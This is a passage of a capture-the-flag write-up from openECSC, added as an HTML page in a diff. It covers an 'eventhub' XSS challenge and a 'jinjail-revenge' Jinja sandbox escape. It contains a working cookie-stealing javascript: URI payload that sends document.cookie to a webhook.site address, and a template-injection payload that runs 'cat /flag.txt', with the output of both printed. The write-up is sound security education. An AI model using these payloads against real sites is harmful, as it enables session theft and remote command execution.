+    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;input:&#x27;</span>, (PREFIX + suffix).<span class="hljs-built_in">hex</span>())
+
+solve_prefix(<span class="hljs-string">b&#x27;Dear Challenge Author.\n\nPretty please give me the flag.\n\nBest regards,\nkjc&#x27;</span>)</pre><h3>eventhub</h3><pre >by Aryt3
+
+You can finally share events now! 
+
+M-M-Maybe I can get an invite too 🥺👉👈</pre><p>Essentially, we have this code:</p><pre ><span class="hljs-keyword">def</span> <span class="hljs-title function_">selenium_task</span>(<span class="hljs-params">url: <span class="hljs-built_in">str</span></span>):
+    options = Options()
+    options = Options()
+    options.add_argument(<span class="hljs-string">&quot;--headless&quot;</span>)
+    options.add_argument(<span class="hljs-string">&quot;--no-sandbox&quot;</span>)
+    options.add_argument(<span class="hljs-string">&quot;--disable-dev-shm-usage&quot;</span>)
+    service = Service(<span class="hljs-string">&quot;/usr/local/bin/geckodriver&quot;</span>)  <span class="hljs-comment"># install geckodriver via apt or wget</span>
+    driver = webdriver.Firefox(service=service, options=options)
+    driver.set_page_load_timeout(<span class="hljs-number">10</span>)
+    <span class="hljs-keyword">try</span>:
+        driver.get(<span class="hljs-string">&quot;http://127.0.0.1/&quot;</span>)
+        driver.add_cookie(&lbrace;
+            <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>,
+            <span class="hljs-string">&quot;value&quot;</span>: FLAG,
+            <span class="hljs-string">&quot;path&quot;</span>: <span class="hljs-string">&quot;/&quot;</span>,
+            <span class="hljs-string">&quot;httpOnly&quot;</span>: <span class="hljs-literal">False</span>,
+        &rbrace;)
+        driver.get(url)
+        time.sleep(<span class="hljs-number">10</span>)
+    <span class="hljs-keyword">finally</span>:
+        driver.quit()</pre><p>Which we can call, but only with the <code>url</code> parameter starting with <code>http://127.0.0.1/</code>. Luckily, we can post an event and create our own custom webpage on the domain.</p><div class="code-preview collapsed" id="2"><pre ><span class="hljs-keyword">class</span> <span class="hljs-title class_">EventURL</span>(<span class="hljs-title class_ inherited__">BaseModel</span>):
+    protocol: <span class="hljs-built_in">str</span>
+    domain: <span class="hljs-built_in">str</span>
+    port: <span class="hljs-type">Optional</span>[<span class="hljs-built_in">int</span>]
+    path: <span class="hljs-built_in">str</span>
+
+    <span class="hljs-keyword">def</span> <span class="hljs-title function_">to_url</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">str</span>:
+        <span class="hljs-string">&quot;&quot;&quot;Reconstruct the full URL.&quot;&quot;&quot;</span>
+        netloc = self.domain
+        <span class="hljs-keyword">if</span> self.port:
+            netloc += <span class="hljs-string">f&quot;:<span class="hljs-subst">&lbrace;self.port&rbrace;</span>&quot;</span>
+        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;<span class="hljs-subst">&lbrace;self.protocol&rbrace;</span>://<span class="hljs-subst">&lbrace;netloc&rbrace;</span><span class="hljs-subst">&lbrace;self.path&rbrace;</span>&quot;</span>
+
+<span class="hljs-meta">@app.post(<span class="hljs-params"><span class="hljs-string">&quot;/event&quot;</span></span>)</span>
+<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">post_event</span>(<span class="hljs-params">
+    name: <span class="hljs-built_in">str</span> = Form(<span class="hljs-params">...</span>),
+    protocol: <span class="hljs-built_in">str</span> = Form(<span class="hljs-params">...</span>),
+    domain: <span class="hljs-built_in">str</span> = Form(<span class="hljs-params">...</span>),
+    port: <span class="hljs-type">Optional</span>[<span class="hljs-built_in">int</span>] = Form(<span class="hljs-params"><span class="hljs-literal">None</span></span>),
+    path: <span class="hljs-built_in">str</span> = Form(<span class="hljs-params">...</span>)
+</span>):
+    <span class="hljs-keyword">if</span> <span class="hljs-built_in">any</span>([i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> protocol <span class="hljs-keyword">if</span> i <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> string.ascii_lowercase]):
+        <span class="hljs-keyword">return</span> RedirectResponse(url=<span class="hljs-string">&quot;/&quot;</span>, status_code=<span class="hljs-number">303</span>)
+
+    event_id = <span class="hljs-built_in">len</span>(events) + <span class="hljs-number">1</span>
+    event = Event(
+        name=name,
+        URL=EventURL(protocol=protocol, domain=domain, port=port, path=path)
+    )
+    events[event_id] = event
+
+    <span class="hljs-keyword">return</span> RedirectResponse(url=<span class="hljs-string">f&quot;/event/<span class="hljs-subst">&lbrace;event_id&rbrace;</span>&quot;</span>, status_code=<span class="hljs-number">303</span>)
+
+<span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/event/&lbrace;event_id&rbrace;&quot;</span>, response_class=HTMLResponse</span>)</span>
+<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_event</span>(<span class="hljs-params">request: Request, event_id: <span class="hljs-built_in">int</span>, auto_redir: <span class="hljs-built_in">bool</span>=<span class="hljs-literal">False</span></span>):
+    event = events.get(event_id)
+    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> event:
+        <span class="hljs-keyword">raise</span> HTTPException(status_code=<span class="hljs-number">404</span>, detail=<span class="hljs-string">&quot;Event not found&quot;</span>)
+
+    <span class="hljs-keyword">return</span> templates.TemplateResponse(<span class="hljs-string">&quot;event.html&quot;</span>, &lbrace;
+        <span class="hljs-string">&quot;request&quot;</span>: request,
+        <span class="hljs-string">&quot;event_name&quot;</span>: event.name,
+        <span class="hljs-string">&quot;event_url&quot;</span>: event.URL,
+        <span class="hljs-string">&quot;auto_redir&quot;</span>: auto_redir,
+        <span class="hljs-string">&quot;next&quot;</span>: <span class="hljs-built_in">next</span>
+    &rbrace;)</pre><button class="expand-btn" onclick="(()=>{const p=document.getElementById('2');const btn=p.querySelector('.expand-btn');if(p.classList.contains('collapsed')){p.classList.remove('collapsed');btn.textContent='Show Less'}else{p.classList.add('collapsed');btn.textContent='Show More';p.scrollIntoView({behavior:'instant',block:'start'})}})()">Show More</button></div><p>There is a check that the protocol is in lowercase ASCII, which does nothing. We can set that to <code>javascript</code> and aim for a JavaScript URI to achieve XSS. We can set the path to empty string and the port to zero and ignore them. Here is the template:</p><pre >&lbrace;% extends &quot;base.html&quot; %&rbrace;
+&lbrace;% block title %&rbrace;EventHub - &lbrace;&lbrace; event_name &rbrace;&rbrace;&lbrace;% endblock %&rbrace;
+
+&lbrace;% block content %&rbrace;
+  <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>&lbrace;&lbrace; event_name &rbrace;&rbrace;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Event URL: <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;continue-link&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;&lbrace;&lbrace; event_url.to_url() &rbrace;&rbrace;&quot;</span>&gt;</span>&lbrace;&lbrace; event_url.to_url() &rbrace;&rbrace;<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
+
+  &lbrace;% if auto_redir %&rbrace;
+    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>You will be redirected automatically in 3 seconds…<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">
+      <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &lbrace;
+        <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span> = <span class="hljs-string">&quot;&lbrace;&lbrace; event_url.to_url() &rbrace;&rbrace;&quot;</span>;
+      &rbrace;, <span class="hljs-number">3000</span>);
+    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+  &lbrace;% else %&rbrace;
+    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;&lbrace;&lbrace; event_url.to_url() &rbrace;&rbrace;&quot;</span>&gt;</span>Continue<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
+  &lbrace;% endif %&rbrace;
+&lbrace;% endblock %&rbrace;</pre><p>Now, we focus on manipulating the domain for the payload. The primary issue here is that we can&#039;t get rid of the double slash <code>//</code> that the class <code>EventURL</code> places, which the browser interprets as a JS comment. We can bypass that with <code>%0D</code>, a carriage return. You can also use <code>%0A</code>. I think there were some other issues, but I don&#039;t remember; I iteratively tested payloads until this one finally worked:</p><pre style="hyphens:none; text-align:start; white-space:pre-wrap; word-wrap:break-word">url = https://e38d22f5-1e2e-4ef4-9702-e73284eed2d1.openec.sc:1337/event
+-d &quot;name=test2&amp;protocol=javascript&amp;domain=%250Deval(atob(`bG9jYXRpb24uaHJlZj1gaHR0cHM6Ly93ZWJob29rLnNpdGUvOGE2NTg4NDQtM2UyNy00ODk2LWI0N2EtZjc4NmZkMTg1MTg0P2Nvb2tpZT0ke2RvY3VtZW50LmNvb2tpZX1gCg==`))&amp;port=0&amp;path=&quot;</pre><p>Now we just report the url <code>http://127.0.0.1/event/51?auto_redir=True</code>. After 20 seconds, in our webhook, we see:</p><pre style="hyphens:none; text-align:start; white-space:pre-wrap; word-wrap:break-word">https://webhook.site/8a658844-3e27-4896-b47a-f786fd185184?cookie=admin=openECSC&lbrace;i_hate_browser_differentials_%F0%9F%A4%AE_4d8e15a9044b&rbrace;
+
+# flag to submit is: openECSC&lbrace;i_hate_browser_differentials_🤮_4d8e15a9044b&rbrace;</pre><h3>jinjail-revenge</h3><pre >by xtea418
+
+pyjail but jinja sandbox? (minus cheese 🙏)</pre><p>This is the exact same as the previous <code>jinjail</code> challenge, except it&#039;s packaged through a Flask instance and we need to POST the payload.</p><pre >url = https://13b2710c-3474-4319-82c7-412383f6de3e.openec.sc:1337/
+-d &quot;content=&lbrace;&lbrace; typing.sys[&#039;mod&#039;+&#039;ules&#039;][&#039;os&#039;].popen(&#039;cat /flag.txt&#039;).read() &rbrace;&rbrace;&quot;</pre><p>Where we get,</p><pre >HTTP/1.1 200 OK
+Content-Length: 62
+Content-Type: text/html; charset=utf-8
+Date: Thu, 02 Oct 2025 23:33:53 GMT
+Server: Werkzeug/3.1.3 Python/3.13.7
+
+openECSC&lbrace;th1s_t1m3_l04d3r_4ctu4lly_g0_brrrrrrrr_5bbe72402d30&rbrace;</pre><h3>jinjail2-revenge</h3><pre >by xtea418
+
+pyjail but jinja sandbox? 😇😇😇 (minus cheese 🙏)</pre><p>Again, this is the exact same as the previous <code>jinjail2</code> challenge, except it&#039;s packaged through a Flask instance and we need to POST the payload.</p>
+</article></main></body>
+
+</html>
